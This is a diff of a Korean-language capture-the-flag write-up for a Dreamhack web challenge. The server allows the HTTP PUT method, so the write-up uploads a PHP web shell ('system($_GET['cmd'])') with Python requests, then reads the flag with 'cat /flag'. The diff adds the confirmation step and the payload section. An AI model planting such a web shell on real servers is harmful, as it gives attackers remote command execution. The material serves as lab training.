@@ -1,4 +1,4 @@
-# 문제 설명
+<img width="560" height="69" alt="image" src="https://github.com/user-attachments/assets/bb8acbce-c243-4553-b5f7-845cf27b1145" /># 문제 설명
 <img width="224" height="112" alt="image" src="https://github.com/user-attachments/assets/82c28276-dbfe-4c23-9358-a50c592166cd" />
 
 # 목표
@@ -30,7 +30,7 @@ print("Allow method : ", res.headers.get("Allow"))
 ```
 
 <img width="556" height="20" alt="image" src="https://github.com/user-attachments/assets/46b4b13b-94cb-498b-b5c4-69b1b5033faa" /><br>
-허용 메서드로 수많은 메서드가 포함되어 있으며 PUT 메서드 또한 허용되어 있으므로 임의로 파일을 수정하거나, 덮어씌울 수 있다
+허용 메서드로 수많은 메서드가 포함되어 있으며 PUT 메서드 또한 허용되어 있으므로 웹쉘 업로드가 가능해 보인다
 
 # 익스플로잇
 ```python
@@ -41,4 +41,13 @@ URL = "http://host3.dreamhack.games:11749/user/shell.php"
 payload = "<?php system($_GET['cmd']); ?>"
 
 res = requests.put(URL, data=payload)
+```
+한번 cmd 파라미터를 추가해보면<br>
+<img width="560" height="69" alt="image" src="https://github.com/user-attachments/assets/e0b74cdc-c1a2-48b5-ad52-ffcf15f40b55" /><br>
+웹쉘이 정상적으로 들어간 것을 볼 수 있다.
+
+## 페이로드
+웹쉘로 
+```html
+cat /flag
 ```
